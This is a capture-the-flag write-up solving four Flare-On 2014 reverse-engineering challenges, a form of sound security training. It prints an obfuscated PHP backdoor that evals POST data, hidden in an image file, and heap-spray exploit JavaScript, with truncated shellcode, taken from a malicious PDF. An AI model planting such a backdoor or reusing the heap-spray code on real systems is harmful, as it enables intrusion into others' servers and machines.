# FlareOn 2014

- [x] [Challenge 1](#challenge-1) 
- [x] [Challenge 2](#challenge-2)
- [x] [Challenge 3](#challenge-3)
- [x] [Challenge 4](#challenge-4)
- [ ] [Challenge 5](#challenge-5)
- [ ] [Challenge 6](#challenge-6)
- [ ] [Challenge 7](#challenge-7) 

## Challenge 1

We are given a .NET executable. Opening it in dnSpy reveals the following
code for a decode function:

```
private void btnDecode_Click(object sender, EventArgs e)
{
    this.pbRoge.Image = Resources.bob_roge;
    byte[] dat_secret = Resources.dat_secret;
    string text = "";
    foreach (byte b in dat_secret)
    {
        text += (char)((b >> 4 | ((int)b << 4 & 240)) ^ 41);
    }
    text += "\0";
    string text2 = "";
    for (int j = 0; j < text.Length; j += 2)
    {
        text2 += text[j + 1];
        text2 += text[j];
    }
    string text3 = "";
    for (int k = 0; k < text2.Length; k++)
    {
        char c = text2[k];
        text3 += (char)((byte)text2[k] ^ 102);
    }
    this.lbl_title.Text = text3;
}
```

After saving the `dat_secret` file from the resouces in the executable, we
can run the following re-implementation of the decryption function in
python:

```
f = open('dat_secret', 'rb')
x = f.read()

y = ''
for i in x:
    y += chr(((i>>4) | ((i<<4) & 240)) ^ 41)

y += '\0'
print(y)

z = ''
for i in range(0,16,2):
    z += y[i+i]
    z += y[i]
print(z)

w = ''
for i in z:
    w += chr(ord(i)^102)
print(w)
```

It took me a while to find the flag, since I was only looking at the final
output of the decryption. As output to the first step of the decryption, we
get the flag: `3rmahg3rd.b0b.d0ge@flare-on.com`

## Challenge 2

I wasn't able to extract the zip file at first. Turns out the native
Windows zip extractor doesn't support passwords? I tried turning off and
excluding the folder from Windows Defender and after a while downloaded
7-zip and it was able to extract the challenge successfully.

Moving on to the challenge... in the given HTML file at line 152 towards
the end we have the following code: `<?php include "img/flare-on.png" ?>`

At the end of the image file, we find the following php code:

```
<?php $terms = array( "M", "Z", "]", ... "4", "8", "e", "|");
$order = array( 59, 71, ... 29, 47);
$do_me = "";
for ($i = 0;$i < count($order);$i++)
{
    $do_me = $do_me . $terms[$order[$i]];
}
eval($do_me); ?>
```

Printing the `$do_me` variable at the end gives us the following output:

```
$_= \'aWYoaXNzZXQoJF9QT1NUWyJcOTdcNDlcNDlcNjhceDRGXDg0XDExNlx4NjhcOTdceDc0XHg0NFx4NEZceDU0XHg2QVw5N1x4NzZceDYxXHgzNVx4NjNceDcyXDk3XHg3MFx4NDFcODRceDY2XHg2Q1w5N1x4NzJceDY1XHg0NFw2NVx4NTNcNzJcMTExXDExMFw2OFw3OVw4NFw5OVx4NkZceDZEIl0pKSB7IGV2YWwoYmFzZTY0X2RlY29kZSgkX1BPU1RbIlw5N1w0OVx4MzFcNjhceDRGXHg1NFwxMTZcMTA0XHg2MVwxMTZceDQ0XDc5XHg1NFwxMDZcOTdcMTE4XDk3XDUzXHg2M1wxMTRceDYxXHg3MFw2NVw4NFwxMDJceDZDXHg2MVwxMTRcMTAxXHg0NFw2NVx4NTNcNzJcMTExXHg2RVx4NDRceDRGXDg0XDk5XHg2Rlx4NkQiXSkpOyB9\';$__=\'JGNvZGU9YmFzZTY0X2RlY29kZSgkXyk7ZXZhbCgkY29kZSk7\';$___="\x62\141\x73\145\x36\64\x5f\144\x65\143\x6f\144\x65";eval($___($__));
```

`$___` is hex encoded ASCII string:

```
>>> '\x62\141\x73\145\x36\64\x5f\144\x65\143\x6f\144\x65'
'base64_decode'
```

So we are basically base64 decoding `$__` and eval'ing it.

```
$ echo JGNvZGU9YmFzZTY0X2RlY29kZSgkXyk7ZXZhbCgkY29kZSk7 | base64 -d
$code=base64_decode($_);eval($code);
```

Now we see that `$__` is base64 decoding `$_` and eval'ing that. So `$_`
is:

```
if(isset($_POST["\97\49\49\68\x4F\84\116\x68\97\x74\x44\x4F\x54\x6A\97\x76\x61\x35\x63\x72\97\x70\x41\84\x66\x6C\97\x72\x65\x44\65\x53\72\111\110\68\79\84\99\x6F\x6D"])) { eval(base64_decode($_POST["\97\49\x31\68\x4F\x54\116\104\x61\116\x44\79\x54\106\97\118\97\53\x63\114\x61\x70\65\84\102\x6C\x61\114\101\x44\65\x53\72\111\x6E\x44\x4F\84\99\x6F\x6D"])); }
```

We can see that the POST parameter is a mix of decimal and hex characters.
So I wrote a python script to decode it for us:


```
enc = r"\97\49\49\68\x4F\84\116\x68\97\x74\x44\x4F\x54\x6A\97\x76\x61\x35\x63\x72\97\x70\x41\84\x66\x6C\97\x72\x65\x44\65\x53\72\111\110\68\79\84\99\x6F\x6D"

ans = ''
for i in enc.split('\\'):
    if i == '':
        continue
    if i.startswith('x'):
        ans += chr(int(i[1:],16))
    else:
        ans += chr(int(i))

print(ans)

#a11DOTthatDOTjava5crapATflareDASHonDOTcom
```

Flag: `a11.that.java5crap@flare-on.com`


## Challenge 3

We are given a binary file named `such_evil`.

After loading it into IDA, we see that there is a `call sub_401000` in the
entry function. In this function there are a lot of single byte move
operations and towards the end, there is a call to the start of the address
space in which these single byte move operations start.

Basically, this means that we have moved data that is now going to be
interpreted as instructions. To analyze this code, we need to set a break
point right after all the code is moved into memory.

The instructions are a bunch of loops that decode multiple strings. It can
very easily be dynamically analyzed by setting a break point right after a
loop ends and inspecting the memory. As we can see, the last string is the
flag.

```
debug007:0019FD50 aAndSoItBegins db 'and so it begins'
debug007:0019FDA3 aGetReadyToGetN db 'get ready to get nop',27h,'ed so damn hard'
debug007:0019FE59 aSuch5h31101010 db 'such.5h311010101@flare-on.com'
```

Flag: `such.5h311010101@flare-on.com`

## Challenge 4

In this challenge, we get a PDF file called `APT9001.pdf`. If you open this
file, Windows Defender detects something suspicious and quarantines it.
Turns out, after looking at the solution, that this is an exploit
targetting an older version of Acrobat.

On opening the PDF file with a text editor, we see that there are a lot of
hex encoded characters. One of the lines that stands out is:

```
/Actio#6e   /#53   /#4aav#61#53cr#69pt /#4a#53  6 0 R >> endobj
```

After decoding:

```
/Action  /S /JavaScript /JS 6 0 R >> endobj
```

Further down, there is a blob of raw data. I am not aware of how PDF
workds, but looking at one of the strings, it seems that the data is
FlatDecoded. After some searching online, I used a tool called qpdf with
the following command to get the plaintext version of the data:

```
> .\qpdf.exe --qdf --object-streams=disable .\APT9001.pdf out.pdf
```

We get a blob of JS code. After arbritrarily renaming variables, we get this:

```
var never_used = "";
var some_string = "";
var first_unescape = unescape("%u72f9%u...");
var another_string = "";

for (i=128;i>=0;--i)
    another_string += unescape("%ub32f%u3791");

boss_string = another_string + first_unescape;
second_unescape = unescape("%ub32f%u3791");
some_length = 20;

boss_length = some_length + boss_string.length
while (second_unescape.length < boss_length)
    second_unescape += second_unescape;

some_sub = second_unescape.substring(0, boss_length);
other_sub = second_unescape.substring(0, second_unescape.length-boss_length);
while(other_sub.length+boss_length < 0x40000)
    other_sub = other_sub + other_sub + some_sub;

some_array = new Array();
for (i=0;i<100;i++)
    some_array[i] = other_sub + boss_string;

for (i=142;i>=0;--i)
    some_string += unescape("%ub550%u0166");

sakura_length = some_string.length + 20
while (some_string.length < sakura_length)
    some_string += some_string;

y1 = some_string.substring(0, sakura_length);
y2 = some_string.substring(0, some_string.length-sakura_length);

while(y2.length+sakura_length < 0x40000)
    y2 = y2+y2+y1;

x = new Array();
for (i=0;i<125;i++)
    x[i] = y2 + some_string;
```

After running this JS code in the browser and analyzing the contents of
some of the variables, I couldn't find any useful strings mostly garbage.
However, since this might be a buffer overflow vuln, it could be possible
that `first_unescape` was the shellcode.

The output of `unescape("%u72f9%u...");` is UTF-16 little endian. So in
order to extract the shellcode, we need to represent `%u72f9` as `0xf972`.
We can use the following python script to get that:

```
x = "%u72f9%u4649%u1..."

l = []

for i in y:
    if i=='': continue
    l.append(int(i[3:5], 16))
    l.append(int(i[1:3], 16))

f = open('shell', 'wb')
f.write(bytearray(l))
```

Once we have the shellcode, we can convert it into an executable using some
tool like shellcode2exe:

```
> shellcode2exe.py shell
Shellcode to executable converter
by Mario Vilas (mvilas at gmail dot com)

Reading raw shellcode from file shell
Generating executable file
Writing file shell.exe
Done.
```

Now we can execute the exe and see what happens. Turns out there is a
message box titled OWNED!!! with some garbled text in the body. After
opening the exe in IDA, you will notice that there are some ASCII bytes
being pushed into the stack here and there.

I found the "OWNED!!!" string in one of the instructions by manually
decoded the hex strings that I found on the way. I'm sure there must be a
way to display hex strings by default in IDA but I'm not aware of it.
Anyway, the disassembly right after the string is interesting.

```
.text:0040134D                 push    21212144h       ; OWNED!!!
.text:00401352                 push    454E574Fh
.text:00401357                 mov     ebx, esp
.text:00401359                 call    $+5
.text:0040135E                 mov     edx, [esp]
.text:00401361                 xor     dword ptr [edx+0Bh], 32FBA316h
.text:00401368                 push    32BECE79h
.text:0040136D                 xor     dword ptr [edx+17h], 48CF45AEh
.text:00401374                 push    2BE12BC1h
.text:00401379                 xor     dword ptr [edx+23h], 0D29F3610h
.text:00401380                 push    0FFFA4471h
.text:00401385                 xor     dword ptr [edx+2Fh], 0CA9A9F7h
.text:0040138C                 push    60CFE984h
.text:00401391                 xor     dword ptr [edx+3Bh], 43A993BEh
.text:00401398                 push    3798A3D2h
.text:0040139D                 xor     dword ptr [edx+47h], 3B628A82h
.text:004013A4                 push    4B11A4EFh
.text:004013A9                 xor     dword ptr [edx+53h], 0CCC047D6h
.text:004013B0                 push    0FFA469BEh
.text:004013B5                 xor     dword ptr [edx+5Fh], 3154CAA3h
.text:004013BC                 push    5265ABD4h
.text:004013C1                 mov     ecx, esp
```

There are multiple XOR instructions. So I decided to set a breakpoint right
after all these instructions finished and see what's in memory through
dynamic analysis. Here is the hex dump for a relevant portion:

```
........wa1ch.d3
m.spl01ts@flare-
on.comE.^.@.OWNE
D!!!....MessageB
```

Flag: `wa1ch.d3m.spl01ts@flare-on.com`

## Challenge 5
## Challenge 6
## Challenge 7
